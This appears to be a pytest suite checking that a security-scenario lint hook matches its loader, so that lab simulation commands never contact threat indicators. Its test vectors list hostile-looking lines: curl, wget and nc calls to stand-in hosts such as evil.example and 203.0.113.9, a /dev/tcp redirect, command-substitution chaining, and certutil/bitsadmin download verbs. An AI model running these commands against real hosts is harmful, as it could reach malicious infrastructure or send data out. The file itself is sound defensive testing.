"""The .claude/hooks/lint-scenario.py edit hook must AGREE with the boot loader.

The hook's docstring promises it mirrors the loader's REJECT contract. Two
divergences made it block edits the loader accepts cleanly:

  * its plane set omitted ``DLP`` (which ``scenario_loader.VALID_PLANES`` has), so
    a loader-valid ``plane: DLP`` scenario was rejected with an ERROR; and
  * it treated a bare ``cgo_anchor`` (no step wiring ``causality``) as a declared
    spine and errored "more than one root step", while the loader's
    ``validate_causality_spine`` returns early for a zero-causality collection
    and ACCEPTS it — leaving the hook's own warning branch dead.
"""
from __future__ import annotations

import importlib.util
import subprocess
import sys
from pathlib import Path

import yaml


REPO_ROOT = Path(__file__).resolve().parents[2]
HOOK = REPO_ROOT / ".claude" / "hooks" / "lint-scenario.py"
SAMPLE = REPO_ROOT / "scenarios" / "edr" / "edr-006-lsass-memory-dump.yml"


def _load_hook():
    spec = importlib.util.spec_from_file_location("lint_scenario_hook", HOOK)
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_hook_planes_mirror_loader_valid_planes():
    """The hook's PLANES must equal the loader's VALID_PLANES exactly."""
    from engine.scenario_loader import VALID_PLANES  # noqa: PLC0415

    hook = _load_hook()
    assert hook.PLANES == set(VALID_PLANES), (
        "lint hook PLANES diverged from loader VALID_PLANES: "
        f"missing={set(VALID_PLANES) - hook.PLANES} extra={hook.PLANES - set(VALID_PLANES)}"
    )


def test_hook_accepts_cgo_anchor_without_step_causality(tmp_path):
    """cgo_anchor + >=2 steps, none wiring causality: loader ACCEPTS → hook must not error."""
    base = yaml.safe_load(SAMPLE.read_text(encoding="utf-8"))
    assert isinstance(base.get("cgo_anchor"), dict), "sample must carry a cgo_anchor"
    base["steps"] = base["steps"][:2]
    for step in base["steps"]:
        step.pop("causality", None)

    # The loader's own spine validator accepts this (the behaviour the hook must mirror).
    from engine.scenario_loader import validate_causality_spine  # noqa: PLC0415

    class _Caus:
        def __init__(self, parent):
            self.parent_step = parent

    class _Step:
        def __init__(self, sid):
            self.id = sid
            self.causality = None

    validate_causality_spine([_Step("s1"), _Step("s2")])  # must not raise

    crafted = tmp_path / "cgo_no_causality.yml"
    crafted.write_text(yaml.safe_dump(base, sort_keys=False), encoding="utf-8")

    result = subprocess.run(
        [sys.executable, str(HOOK), str(crafted), str(REPO_ROOT)],
        capture_output=True, text=True,
    )
    assert result.returncode == 0, (
        "hook rejected a cgo-anchor-without-step-causality scenario the loader accepts\n"
        f"stdout:\n{result.stdout}"
    )
    assert "more than one root step" not in result.stdout
    # the previously-dead warning branch should now fire
    assert "no step wires a causality" in result.stdout


# ── Indicators S-22..S-27 + marker-only warning ──────────────────────────────
import pytest  # noqa: E402


def test_hook_indicator_vocab_mirrors_loader():
    from engine.scenario_loader import INDICATOR_TYPES, INDICATOR_SAFE_FORMS  # noqa: PLC0415
    hook = _load_hook()
    assert hook.INDICATOR_TYPES == INDICATOR_TYPES and hook.INDICATOR_SAFE_FORMS == INDICATOR_SAFE_FORMS


@pytest.mark.parametrize("mutate,code", [
    (lambda d: d["indicators"][0].update(type="hash"), "S-22"),
    (lambda d: d["indicators"][0].update(source_url="https://example.com/"), "S-23"),
    (lambda d: d["indicators"][0].update(surfaces_in=["step-99"]), "S-24"),
    (lambda d: d["steps"][0].update(command="curl https://rn-stage.example/"), "S-25"),
    (lambda d: d["indicators"][0].update(type="sha256", value="c" * 64, safe_form="hash_only")
        or d["steps"][0].update(command="wget https://x/" + "c" * 64), "S-26"),
    (lambda d: d["indicators"][0].update(type="sha256", value="c" * 64), "S-27"),
])
def test_hook_rejects_each_indicator_code(tmp_path, mutate, code):
    d = yaml.safe_load(SAMPLE.read_text())
    d["indicators"] = [dict(id="ind-01", type="domain", value="rn-stage.example", safe_form="dns_lookup",
                            source_url="https://unit42.paloaltonetworks.com/x/",
                            surfaces_in=[d["steps"][0]["id"]])]
    d["steps"][0]["command"] = "dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}"
    mutate(d)
    p = tmp_path / "s.yml"
    p.write_text(yaml.safe_dump(d, sort_keys=False))
    r = subprocess.run([sys.executable, str(HOOK), str(p), str(REPO_ROOT)], capture_output=True, text=True)
    assert r.returncode != 0 and code in r.stdout


def test_hook_accepts_clean_indicator(tmp_path):
    d = yaml.safe_load(SAMPLE.read_text())
    d["indicators"] = [dict(id="ind-01", type="domain", value="rn-stage.example", safe_form="dns_lookup",
                            source_url="https://unit42.paloaltonetworks.com/x/",
                            surfaces_in=[d["steps"][0]["id"]])]
    d["steps"][0]["command"] = "dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}"
    p = tmp_path / "s.yml"
    p.write_text(yaml.safe_dump(d, sort_keys=False))
    r = subprocess.run([sys.executable, str(HOOK), str(p), str(REPO_ROOT)], capture_output=True, text=True)
    assert r.returncode == 0, r.stdout


def test_hook_marker_only_step_is_a_warning_not_an_error(tmp_path):
    d = yaml.safe_load(SAMPLE.read_text())
    d["steps"][0]["command"] = "echo marker || true"
    p = tmp_path / "s.yml"
    p.write_text(yaml.safe_dump(d, sort_keys=False))
    r = subprocess.run([sys.executable, str(HOOK), str(p), str(REPO_ROOT)], capture_output=True, text=True)
    assert r.returncode == 0 and "marker-only" in r.stdout and d["steps"][0]["id"] in r.stdout


@pytest.mark.parametrize("cmd,expected", [
    ("echo hi", True), ("printf 'x'\n: nothing", True), ("Write-Host 'x'", True),
    ("echo m; curl -s http://127.0.0.1:8080/ || true", True),
    ("echo m; dig +short rn-stage.example", False),
    ("python3 -m scripts.eal_simulator.cli run /tmp/c.yml --live", False),
])
def test_is_marker_only(cmd, expected):
    assert _load_hook().is_marker_only(cmd) is expected


# ── Fix round 1: loader-parity tightening + canonical marker rule ────────────
def _ind(**kw):
    base = dict(id="ind-01", type="domain", value="rn-stage.example", safe_form="dns_lookup",
                source_url="https://unit42.paloaltonetworks.com/x/", surfaces_in=["S"])
    base.update(kw)
    return base


def _violations(indicators, command="echo ok", variants=None, cleanup=None):
    hook = _load_hook()
    step = {"id": "S", "command": command}
    if variants:
        step["platform_variants"] = variants
    return hook.unsafe_indicator_lines(indicators, [step], cleanup)


def _hook_out(tmp_path, mutate):
    d = yaml.safe_load(SAMPLE.read_text())
    d["indicators"] = [_ind(surfaces_in=[d["steps"][0]["id"]])]
    d["steps"][0]["command"] = "dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}"
    mutate(d)
    p = tmp_path / "s.yml"
    p.write_text(yaml.safe_dump(d, sort_keys=False))
    return subprocess.run([sys.executable, str(HOOK), str(p), str(REPO_ROOT)], capture_output=True, text=True)


def test_fix_scans_platform_variants():
    v = _violations([_ind()], variants={"linux": "curl https://rn-stage.example/"})
    assert any("S-25" in x and "platform_variants[linux]" in x for x in v)


def test_fix_scans_cleanup_commands():
    v = _violations([_ind()], cleanup=["curl https://rn-stage.example/"])
    assert any("S-25" in x and "cleanup" in x for x in v)


def test_fix_cleanup_via_subprocess(tmp_path):
    r = _hook_out(tmp_path, lambda d: d.update(cleanup={"commands": ["wget rn-stage.example"]}))
    assert r.returncode != 0 and "S-25" in r.stdout and "cleanup" in r.stdout


def test_fix_subdomain_counts_but_prefixed_label_does_not():
    assert _violations([_ind()], "curl https://www.rn-stage.example/")
    assert not _violations([_ind()], "curl https://x-rn-stage.example/")


@pytest.mark.parametrize("cmd,fires", [
    ("dig +short rn-stage.example @${LAB_RESOLVER:-1.1.1.1}", False),
    ("dig +short rn-stage.example", True),  # no resolver named
    ("dig +short rn-stage.example | xargs curl", True),
    ("dig rn-stage.example; nc rn-stage.example 443", True),
    ("dig rn-stage.example && nc rn-stage.example 443", True),
    ("dig rn-stage.example || nc rn-stage.example 443", True),
    ("dig $(curl rn-stage.example)", True),
    ("dig `echo rn-stage.example`", True),
])
def test_fix_dns_exemption_forbids_chaining(cmd, fires):
    assert bool(_violations([_ind()], cmd)) is fires


def test_fix_id_is_exactly_two_digits_and_unique(tmp_path):
    r = _hook_out(tmp_path, lambda d: d["indicators"][0].update(id="ind-001"))
    assert r.returncode != 0 and "S-22" in r.stdout
    r = _hook_out(tmp_path, lambda d: d["indicators"].append(dict(d["indicators"][0])))
    assert r.returncode != 0 and "S-22" in r.stdout and "duplicate" in r.stdout


def test_fix_all_types_match_case_insensitively():
    ind = _ind(type="url", value="https://Bad.example/Path/Evil", safe_form="log_field")
    assert _violations([ind], "curl https://bad.example/path/evil")
    v6 = _ind(type="ipv6", value="2001:DB8::1", safe_form="log_field")
    assert _violations([v6], "curl 2001:db8::1")


@pytest.mark.parametrize("cmd,expected", [
    (None, True), ("", True),
    ("echo a | cat", False),
    ("echo a | true", True),
    ("echo a && echo b; : x", True),
    ("# comment\ntrue", True),
    ("echo m; dig +short d", False),
    ("echo m; curl -s http://localhost/ || true", True),
    ("cortexsim-eal run", False),
])
def test_fix_canonical_marker_rule(cmd, expected):
    assert _load_hook().is_marker_only(cmd) is expected


# ── Fix round 2: loader parity + malformed-field robustness ──────────────────
def _pairs(lines):
    import re as _re  # noqa: PLC0415
    return {(m.group(1), m.group(2)) for ln in lines
            for m in [_re.match(r"^(S-\d+): (.*?) line \d+", ln)] if m}


_PARITY_VECTORS = [
    ("curl on domain", [_ind()], "curl https://rn-stage.example/", None, None),
    ("dig allowed", [_ind()], "dig +short rn-stage.example @${R:-1.1.1.1}", None, None),
    ("dig npm hostname", [_ind(value="npm-cache.example")],
     "dig +short npm-cache.example @${LAB_RESOLVER:-127.0.0.53}", None, None),
    ("host curl hostname", [_ind(value="curl.example")], "host curl.example ${LAB_RESOLVER}", None, None),
    ("dig piped xargs curl", [_ind()], "dig +short rn-stage.example | xargs curl -s", None, None),
    ("hash npm", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
     "npm install evil-pkg " + "d" * 64, None, None),
    ("hash abs curl", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
     "/usr/bin/curl -O https://x/" + "d" * 64 + ".bin", None, None),
    ("hash sudo wget", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
     "sudo wget https://x/" + "d" * 64, None, None),
    ("hash pip3", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
     "pip3 download " + "d" * 64, None, None),
    ("hash mycurl", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
     "mycurl " + "d" * 64, None, None),
    ("hash IWR upper", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
     "IWR -Uri https://x/" + "d" * 64, None, None),
    ("hash CURL upper", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
     "CURL -O https://x/" + "d" * 64 + ".bin", None, None),
    ("hash Invoke-webrequest", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
     "Invoke-webrequest -Uri https://x/" + "d" * 64, None, None),
    ("hash iwr", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
     "Invoke-WebRequest -Uri https://x/" + "d" * 64, None, None),
    ("dig chained", [_ind()], "dig rn-stage.example; nc rn-stage.example 443", None, None),
    ("dig piped", [_ind()], "dig rn-stage.example | xargs curl", None, None),
    ("params block", [_ind()],
     "cat <<EOF\nparams:\n  host: rn-stage.example\nEOF\ncurl rn-stage.example", None, None),
    ("variants", [_ind()], "echo ok", {"linux": "wget rn-stage.example"}, None),
    ("cleanup", [_ind()], "echo ok", None, ["curl rn-stage.example"]),
    ("subdomain", [_ind()], "curl https://www.rn-stage.example/", None, None),
    ("prefixed label", [_ind()], "curl https://x-rn-stage.example/", None, None),
    ("url case", [_ind(type="url", value="https://Bad.example/Path/Evil", safe_form="log_field")],
     "curl https://bad.example/path/evil", None, None),
    ("ipv6 case", [_ind(type="ipv6", value="2001:DB8::1", safe_form="log_field")],
     "curl 2001:db8::1", None, None),
    ("ipv4", [_ind(type="ipv4", value="8.8.4.4", safe_form="log_field")], "nc 8.8.4.4 53", None, None),
    ("hash curl.exe", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
     "curl.exe -O https://x/" + "d" * 64 + ".bin", None, None),
    ("hash curl.example", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
     "curl.example " + "d" * 64, None, None),
    ("hash on fetch", [_ind(type="sha256", value="c" * 64, safe_form="hash_only")],
     "wget https://x/" + "c" * 64, None, None),
    ("hash off fetch", [_ind(type="sha256", value="c" * 64, safe_form="hash_only")],
     "echo " + "c" * 64 + " | sha256sum -c", None, None),
] + [
    # ── final review: I1 / I2 / M2 / M3 / M4 ──
    (f"I1 {i}", [ind], cmd, None, None) for i, (ind, cmd) in enumerate([
        (_ind(value="evil.example"), "dig evil.example >/dev/tcp/203.0.113.9/443"),
        (_ind(value="evil.example"), "dig evil.example & nc evil.example 443"),
        (_ind(value="evil.example"), "dig evil.example <(nc 203.0.113.9 80)"),
        (_ind(value="evil.example"), "dig evil.example @${LAB_RESOLVER:-127.0.0.53} >(nc x 80)"),
        (_ind(value="evil.example"), "dig evil.example @${LAB_RESOLVER:-127.0.0.53} > /tmp/o"),
        (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"), "dig @203.0.113.9 evil.example"),
        (_ind(value="evil.example"), "dig +short evil.example"),
        (_ind(value="evil.example"), "dig +short evil.example @evil.example"),
        (_ind(value="evil.example"), "dig +short evil.example @${LAB_RESOLVER:-127.0.0.53}"),
        (_ind(value="evil.example"), "nslookup evil.example $env:LAB_RESOLVER"),
        (_ind(value="evil.example"), "getent hosts evil.example"),
    ])
] + [
    (f"I2 {i}", [_ind(type="ipv4", value="203.0.113.9", safe_form="log_field")], cmd, None, None)
    for i, cmd in enumerate([
        "bash <<'EOF'\nparams:\n  curl http://203.0.113.9/x\nEOF",
        "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: c2_http_beacon\n    params:\n"
        "      target_url: http://203.0.113.9/\nYML",
        "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
        "      dst_ip: 203.0.113.9\nYML",
        "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
        "      dst_ip: 203.0.113.9\n  - plugin: ssh_egress\n    params:\n      host: x\nYML",
        "cat > \"$W/c.yaml\" <<'YML'\nsteps:\n  - plugin: email_emitter\n    params:\n"
        "      ip: 203.0.113.9\nYML",
        "cat > /tmp/c.yml <<YML\nparams:\n  dst_ip: 203.0.113.9\nYML",
    ])
] + [
    ("M2 herestring", [_ind(type="ipv4", value="203.0.113.9", safe_form="log_field")],
     "cat > /tmp/c.yml <<<EOF\nplugin: ngfw_eal_emitter\nparams:\n  curl http://203.0.113.9/x\nEOF",
     None, None),
    ("M2 comment", [_ind(type="ipv4", value="203.0.113.9", safe_form="log_field")],
     "# cat > /tmp/c.yml <<EOF\nplugin: ngfw_eal_emitter\nparams:\n  curl http://203.0.113.9/x\nEOF",
     None, None),
    ("M2 arith", [_ind(value="evil.example")],
     "x=$(( FLAG << SHIFT ))\ndig +short evil.example @${LAB_RESOLVER:-127.0.0.53}\nSHIFT", None, None),
    ("M3 url host", [_ind(type="url", value="https://evil.example/s2", safe_form="log_field")],
     "curl http://evil.example/other", None, None),
    ("M3 url host lookup", [_ind(type="url", value="https://evil.example/s2", safe_form="log_field")],
     "dig +short evil.example @${LAB_RESOLVER:-127.0.0.53}", None, None),
    ("M3 url ip host", [_ind(type="url", value="http://203.0.113.9:8080/x", safe_form="log_field")],
     "nc 203.0.113.9 8080", None, None),
] + [
    (f"M4 {v}", [_ind(type="sha256", value="e" * 64, safe_form="hash_only")],
     f"{v} https://x/" + "e" * 64, None, None)
    for v in ("certutil -urlcache -f", "bitsadmin /transfer j", "Start-BitsTransfer -Source",
              "aria2c", "scp", "tftp -g -r", "ftp -n", "ftp.example", "sftp-helper")
]


@pytest.mark.parametrize("name,inds,cmd,variants,cleanup", _PARITY_VECTORS,
                         ids=[v[0] for v in _PARITY_VECTORS])
def test_hook_unsafe_lines_match_loader(name, inds, cmd, variants, cleanup):
    from engine import scenario_loader as sl  # noqa: PLC0415
    hook = _load_hook()
    l_inds = [sl.IndicatorSchema.model_construct(**i) for i in inds]
    l_step = sl.StepSchema.model_construct(id="S", command=cmd, platform_variants=variants or {})
    l_clean = sl.CleanupSchema(commands=cleanup) if cleanup else None
    expected = _pairs(sl.unsafe_indicator_lines(l_inds, [l_step], l_clean))
    h_step = {"id": "S", "command": cmd}
    if variants:
        h_step["platform_variants"] = variants
    got = _pairs(hook.unsafe_indicator_lines(inds, [h_step], cleanup))
    assert got == expected


def test_hook_pins_loader_tables():
    from engine import scenario_loader as sl  # noqa: PLC0415
    hook = _load_hook()
    assert hook._SAFE_FORMS_BY_TYPE == sl._SAFE_FORMS_BY_TYPE
    assert hook.SOURCE_URL_HOSTS == sl.SOURCE_URL_HOSTS


@pytest.mark.parametrize("mutate,code", [
    (lambda d: d["indicators"][0].update(surfaces_in=[{"a": 1}]), "S-24"),
    (lambda d: d["indicators"][0].update(id=["x"]), "S-22"),
    (lambda d: d["indicators"][0].update(type=["x"]), "S-22"),
    (lambda d: d["indicators"][0].update(safe_form=["x"]), "S-27"),
    (lambda d: d["indicators"][0].update(value=["x"]), "S-22"),
    (lambda d: d["indicators"][0].update(source_url=["x"]), "S-23"),
    (lambda d: d["indicators"][0].update(surfaces_in="step-1"), "S-24"),
])
def test_hook_malformed_indicator_fields_report_not_crash(tmp_path, mutate, code):
    r = _hook_out(tmp_path, mutate)
    assert r.returncode != 0 and code in r.stdout
    assert "Traceback" not in r.stdout + r.stderr


@pytest.mark.parametrize("cmd,value", [
    ("dig +short npm-cache.example @${LAB_RESOLVER:-127.0.0.53}", "npm-cache.example"),
    ("host curl.example ${LAB_RESOLVER}", "curl.example"),
])
def test_hook_fetch_verb_in_hostname_does_not_block_lookup(cmd, value):
    hook = _load_hook()
    got = hook.unsafe_indicator_lines([_ind(value=value)], [{"id": "S", "command": cmd}], None)
    assert not any(l.startswith("S-25") for l in got)


@pytest.mark.parametrize("cmd,fires", [
    ("npm install evil-pkg {h}", True), ("/usr/bin/curl -O https://x/{h}.bin", True),
    ("sudo wget https://x/{h}", True), ("pip3 download {h}", True),
    ("mycurl {h}", False), ("Invoke-WebRequest -Uri https://x/{h}", True),
    ("IWR -Uri https://x/{h}", True), ("Invoke-webrequest -Uri https://x/{h}", True),
    ("CURL -O https://x/{h}.bin", True),
    ("curl.exe -O https://x/{h}.bin", True),
    ("C:\\Windows\\System32\\curl.exe -O https://x/{h}", True),
    ("curl.example {h}", False),
    ("curl.exe.example {h}", False),
])
def test_hook_fetch_verb_tokens_s26(cmd, fires):
    hook = _load_hook()
    h = "d" * 64
    got = hook.unsafe_indicator_lines([_ind(type="sha256", value=h, safe_form="hash_only")],
                                      [{"id": "S", "command": cmd.format(h=h)}], None)
    assert any(l.startswith("S-26") for l in got) is fires


# --- campaign_id shape (Task 6d) -------------------------------------------

def _heredoc_cmd(cid: str) -> str:
    return ("cat > /tmp/c.yml <<'EOF'\n"
            f"campaign_id: {cid}\n"
            "steps: []\n"
            "EOF\n"
            "python3 -m eal run /tmp/c.yml\n")


def test_campaign_id_regex_parity_with_campaign_module():
    from eal_simulator import campaign  # noqa: PLC0415

    hook = _load_hook()
    assert hook.CAMPAIGN_ID_RE.pattern == campaign._CAMPAIGN_ID_RE.pattern


def test_campaign_id_bad_shape_is_error():
    hook = _load_hook()
    got = hook.campaign_id_errors([{"id": "step-01", "command": _heredoc_cmd("CMP-MP-033-THREAT")}])
    assert len(got) == 1
    assert "campaign_id 'CMP-MP-033-THREAT' in step step-01 does not match" in got[0]


def test_campaign_id_quoted_and_indented_is_checked():
    hook = _load_hook()
    cmd = "cat <<EOF\n  campaign_id: \"CMP-MP-033-THREAT\"\nEOF\n"
    assert hook.campaign_id_errors([{"id": "s", "command": cmd}])


def test_campaign_id_bad_shape_in_platform_variants_is_error():
    hook = _load_hook()
    got = hook.campaign_id_errors([{"id": "s", "command": "true",
                                    "platform_variants": {"linux": _heredoc_cmd("CMP-X-ABC")}}])
    assert len(got) == 1 and "CMP-X-ABC" in got[0]


import pytest  # noqa: E402


@pytest.mark.parametrize("cid", ["CMP-MP-THREAT-033", "CMP-MP-033", "CMP-NDR-012"])
def test_campaign_id_valid_shapes_pass(cid):
    hook = _load_hook()
    assert hook.campaign_id_errors([{"id": "s", "command": _heredoc_cmd(cid)}]) == []


def test_campaign_id_outside_heredoc_is_ignored():
    hook = _load_hook()
    cmd = "echo 'campaign_id: CMP-MP-033-THREAT'\ncampaign_id: CMP-BAD\n"
    assert hook.campaign_id_errors([{"id": "s", "command": cmd}]) == []


def test_campaign_id_error_reaches_cli_exit_code(tmp_path):
    data = yaml.safe_load(SAMPLE.read_text(encoding="utf-8"))
    data["steps"][0]["command"] = _heredoc_cmd("CMP-MP-033-THREAT")
    p = tmp_path / "bad.yml"
    p.write_text(yaml.safe_dump(data), encoding="utf-8")
    r = subprocess.run([sys.executable, str(HOOK), str(p), str(REPO_ROOT)], capture_output=True, text=True)
    assert "does not match" in r.stdout + r.stderr and "CMP-MP-033-THREAT" in r.stdout + r.stderr
    assert r.returncode != 0


# ── final review: hook mirrors the tightened rule + in_band ──────────────────
_FIRES = [  # (indicator, command) pairs that must fire S-25 in the HOOK
    (_ind(value="evil.example"), "dig evil.example >/dev/tcp/203.0.113.9/443"),
    (_ind(value="evil.example"), "dig evil.example & nc evil.example 443"),
    (_ind(value="evil.example"), "dig evil.example <(nc 203.0.113.9 80)"),
    (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"), "dig @203.0.113.9 evil.example"),
    (_ind(value="evil.example"), "dig +short evil.example"),
    (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"),
     "bash <<'EOF'\nparams:\n  curl http://203.0.113.9/x\nEOF"),
    (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"),
     "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: c2_http_beacon\n    params:\n"
     "      target_url: http://203.0.113.9/\nYML"),
    (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"),
     "cat > /tmp/c.yml <<<EOF\nplugin: ngfw_eal_emitter\nparams:\n  curl http://203.0.113.9/x\nEOF"),
    (_ind(type="url", value="https://evil.example/s2", safe_form="log_field"),
     "curl http://evil.example/other"),
]


@pytest.mark.parametrize("ind,cmd", _FIRES)
def test_final_hook_fires(ind, cmd):
    assert any(l.startswith("S-25") for l in _violations([ind], cmd))


@pytest.mark.parametrize("ind,cmd", [
    (_ind(value="evil.example"), "dig +short evil.example @${LAB_RESOLVER:-127.0.0.53}"),
    (_ind(value="evil.example"), "nslookup evil.example $env:LAB_RESOLVER"),
    (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"),
     "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
     "      dst_ip: 203.0.113.9\nYML"),
    (_ind(value="evil.example"),
     "x=$(( FLAG << SHIFT ))\ndig +short evil.example @${LAB_RESOLVER:-127.0.0.53}\nSHIFT"),
])
def test_final_hook_allows(ind, cmd):
    assert _violations([ind], cmd) == []


def test_final_hook_regexes_and_plugin_set_byte_identical():
    from engine import scenario_loader as sl  # noqa: PLC0415
    hook = _load_hook()
    assert hook.COLLECTOR_POST_PLUGINS == sl.COLLECTOR_POST_PLUGINS
    for h_name, l_name in [("FETCH_VERB_RE", "FETCH_VERB_RE"), ("DNS_LOOKUP_RE", "DNS_LOOKUP_RE"),
                           ("_HEREDOC_RE", "_HEREDOC_RE"), ("_CHAIN_RE", "_SHELL_CHAIN_RE"),
                           ("_SH_COMMENT_RE", "_SH_COMMENT_RE"), ("_SH_ARITH_RE", "_SH_ARITH_RE"),
                           ("_RESOLVER_RE", "_RESOLVER_RE"), ("_RESOLVER_AT_RE", "_RESOLVER_AT_RE"),
                           ("_CAMPAIGN_FILE_WRITE_RE", "_CAMPAIGN_FILE_WRITE_RE"),
                           ("_PLUGIN_LINE_RE", "_PLUGIN_LINE_RE"), ("_URL_HOST_RE", "_URL_HOST_RE")]:
        h, l = getattr(hook, h_name), getattr(sl, l_name)
        assert (h.pattern, h.flags) == (l.pattern, l.flags), h_name


@pytest.mark.parametrize("val", ["no", 0, 1, None, "false"])
def test_final_hook_in_band_must_be_bool(tmp_path, val):
    r = _hook_out(tmp_path, lambda d: d["indicators"][0].update(in_band=val))
    assert r.returncode != 0 and "S-22" in r.stdout and "in_band" in r.stdout


@pytest.mark.parametrize("val", [True, False])
def test_final_hook_in_band_bool_accepted(tmp_path, val):
    r = _hook_out(tmp_path, lambda d: d["indicators"][0].update(in_band=val))
    assert "in_band" not in r.stdout
